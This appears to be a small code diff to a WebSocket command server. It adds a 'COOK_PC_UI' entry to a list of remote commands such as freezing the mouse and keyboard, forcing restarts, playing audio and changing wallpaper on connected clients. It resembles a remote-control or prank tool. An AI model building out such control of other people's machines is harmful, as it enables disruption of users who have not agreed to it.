@@ -20,7 +20,7 @@ setInterval(() => {
   }
 }, 5000);
 
-const knownCommands = ["FREEZE_MOUSE", "UNFREEZE_MOUSE", "FREEZE_KEYBOARD", "LIST_CLIENTS", "UNFREEZE_KEYBOARD", "IMAGE", "CALCULATOR", "SAFE_RESTART", "FORCE_RESTART", "AUDIO", "CHANGE_WALLPAPER", "BYE"];
+const knownCommands = ["FREEZE_MOUSE", "UNFREEZE_MOUSE", "FREEZE_KEYBOARD", "LIST_CLIENTS", "UNFREEZE_KEYBOARD", "IMAGE", "CALCULATOR", "SAFE_RESTART", "FORCE_RESTART", "AUDIO", "COOK_PC_UI", "CHANGE_WALLPAPER", "BYE"];
 const knownSpecialCommands = ["ALL"];
 
 wss.on("connection", (socket) => {
